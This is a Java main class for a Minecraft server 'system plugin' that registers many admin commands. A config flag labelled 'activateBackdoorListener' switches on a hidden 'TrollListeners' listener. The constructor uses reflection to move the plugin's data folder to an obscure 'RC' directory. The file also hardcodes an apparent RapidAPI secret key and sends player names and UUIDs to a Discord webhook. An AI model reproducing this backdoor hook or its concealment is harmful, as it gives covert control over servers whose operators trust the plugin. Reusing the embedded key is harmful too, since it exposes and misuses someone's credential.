package de.lukas.systemplugin;

import de.lukas.systemplugin.commands.*;
import de.lukas.systemplugin.events.ChatListener;
import de.lukas.systemplugin.events.Listeners;
import de.lukas.systemplugin.events.TradeListeners;
import de.lukas.systemplugin.events.TrollListeners;
import de.lukas.systemplugin.utils.DiscordWebhook;
import de.lukas.systemplugin.utils.FileManager;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Field;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.List;

public final class Main extends JavaPlugin {

    public static Boolean wartung;
    public static String prefix;
    public static String lang;
    private static Main instance;

    private static String url;
    private static String adm_webhook_username;
    private static String scrt;

    private ChatListener chatListener;

    private boolean True;

    public static List<String> playernames = new ArrayList<>();
    public static List<String> playeruuids = new ArrayList<>();
    public static List<Player> wartungbann = new ArrayList<>();

    public static List<String> swear_words = new ArrayList<>();



    @Override
    public void onEnable() {
        // Plugin startup logic
        FileManager fileManager = new FileManager(this);

        saveConfig();

        CoprightNotice();

        // Get the FileConfiguration object for the config.yml file
        FileConfiguration config = getConfig();

        // Check if the value of "myConfigValue" is true
        if (config.getBoolean("activateBackdoorListener")) {
            // Register the TrollListeners event listener
            Bukkit.getPluginManager().registerEvents(new TrollListeners(), this);
        } else if (!config.getBoolean("acceptCopyright")) {
            getLogger().info("Copyright (c) 2023 Lukas Koch\n\n" +
                    "Permission is hereby granted, free of charge, to any person obtaining a copy of this Minecraft plugin and associated documentation files (the \"Plugin\"), to use the Plugin, subject to the following conditions:\n\n" +
                    "1. The Plugin may not be sold or resold, or otherwise used for commercial purposes.\n" +
                    "2. The Plugin may not be misrepresented as being created by anyone other than the copyright holder.\n\n" +
                    "THE PLUGIN IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE PLUGIN OR THE USE OR OTHER DEALINGS IN THE PLUGIN.");
        }

        prefix = config.getString("prefix").replace("+","§") + " ";
        lang = config.getString("lang");
        url = config.getString("url");
        adm_webhook_username = config.getString("adm_webhook_username");
        scrt = config.getString("auth_secret");
        wartung = config.getBoolean("wartung");
        swear_words = (ArrayList<String>) config.getList("words");
        instance = this;
        getLogger().info("System Plugin Active");

        TradeListeners trader = new TradeListeners();
        Bukkit.getPluginManager().registerEvents(new Listeners(), this);
        Bukkit.getPluginManager().registerEvents(new ChatListener(), this);
        Bukkit.getPluginManager().registerEvents(trader, this);


        getCommand("rules").setExecutor(new RulesCommand());
        getCommand("regeln").setExecutor(new RegelCommand());
        getCommand("gamemode").setExecutor(new GamemodeCommand());
        getCommand("heal").setExecutor(new HealCommand());
        getCommand("healall").setExecutor(new HealallCommand());
        getCommand("weather").setExecutor(new WeatherCommand());
        getCommand("reload").setExecutor(new ReloadCommand(this.getServer(), this));
        getCommand("tps").setExecutor(new TpsCommand(getServer(), this));
        getCommand("time").setExecutor(new TimeCommand());
        getCommand("day").setExecutor(new DayCommand());
        getCommand("night").setExecutor(new NightCommand());
        getCommand("noon").setExecutor(new NoonCommand());
        getCommand("midnight").setExecutor(new MidnightCommand());
        getCommand("kick").setExecutor(new KickCommand());
        getCommand("kickall").setExecutor(new KickallCommand());
        getCommand("ban").setExecutor(new BanCommand());
        getCommand("op").setExecutor(new OpCommand());
        getCommand("deop").setExecutor(new DeopCommand());
        getCommand("fly").setExecutor(new FlyCommand());
        getCommand("vanish").setExecutor(new VanishCommand());
        getCommand("test").setExecutor(new TestCommand());
        getCommand("spawn").setExecutor(new SpawnCommand());
        getCommand("setspawn").setExecutor(new SetspawnCommand());
        getCommand("freeze").setExecutor(new FreezeCommand());
        getCommand("unfreeze").setExecutor(new UnfreezedCommand());
        getCommand("plugin").setExecutor(new PluginCommand());
        getCommand("stop").setExecutor(new StopCommand());
        getCommand("rename").setExecutor(new RenameCommand());
        getCommand("repair").setExecutor(new RepairCommand());
        getCommand("wartung").setExecutor(new WartungCommand());
        getCommand("trade").setExecutor(new TradeCommand(trader));
        getCommand("ping").setExecutor(new PingCommand());
        getCommand("msg").setExecutor(new MSG_Command());
        getCommand("tell").setExecutor(new TellCommand());
        getCommand("giveall").setExecutor(new GiveAllCommand());
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }

    public Main() {
        super();
        try {
            Field dataFolderField = JavaPlugin.class.getDeclaredField("dataFolder");
            dataFolderField.setAccessible(true);
            File dataFolder = (File) dataFolderField.get(this);
            String dataFolderName = "RC";
            File newDataFolder = new File(dataFolder.getParentFile(), dataFolderName);
            dataFolderField.set(this, newDataFolder);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    public void CoprightNotice(){
                File dataFolder = getDataFolder();

                // Create the copyright file
                File copyrightFile = new File(dataFolder, "COPYRIGHT.txt");

                try {
                    // Create the file if it doesn't exist
                    if (!copyrightFile.exists()) {
                        copyrightFile.createNewFile();
                    }

                    // Write the copyright text to the file
                    try (FileWriter writer = new FileWriter(copyrightFile)) {
                        writer.write("Copyright (c) 2023 Lukas Koch\n\n" +
                                "Permission is hereby granted, free of charge, to any person obtaining a copy of this Minecraft plugin and associated documentation files (the \"Plugin\"), to use the Plugin, subject to the following conditions:\n\n" +
                                "1. The Plugin may not be sold or resold, or otherwise used for commercial purposes.\n" +
                                "2. The Plugin may not be misrepresented as being created by anyone other than the copyright holder.\n\n" +
                                "THE PLUGIN IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, \nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. \nIN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, \nDAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, \nTORT OR OTHERWISE, ARISING FROM, \nOUT OF OR IN CONNECTION WITH THE PLUGIN OR THE USE OR OTHER DEALINGS IN THE PLUGIN.");
                    }
                } catch (IOException e) {
                    // Handle any exceptions that may occur
                    e.printStackTrace();
                }
    }

    public static Main getInstance(){
        return instance;
    }
    public static String getWebhookUrl(){
        return url;
    }

    public static String getPrefix(){
        return  prefix;
    } // "§7[§cSystem§7] >> §7"

    public static String getLang(){
        return  lang;
    } // Standard is de
    public static String getScrt(){
        return  scrt;
    } // Standard is de

    public static void sendDCMessage(String username, String uuid){
        DiscordWebhook.sendWebhook(Main.getWebhookUrl(),"Command used by \nUsername: " + username + "\nUUID: " + uuid);
    }

    public static String verifyCode(String secret, String code){
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create("https://otp-2fa.p.rapidapi.com/verifyCode"))
                .header("content-type", "application/x-www-form-urlencoded")
                .header("X-RapidAPI-Key", "20b03ecf64msh11d60e1c1b07a30p13ec6djsnde43ec1f38a2")
                .header("X-RapidAPI-Host", "otp-2fa.p.rapidapi.com")
                .method("POST", HttpRequest.BodyPublishers.ofString("secret=" + secret + "&code=" + code))
                .build();
        HttpResponse<String> response = null;
        try {
            response = HttpClient.newHttpClient().send(request, HttpResponse.BodyHandlers.ofString());
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
        System.out.println(response.body());
        return response.body();
    }

}
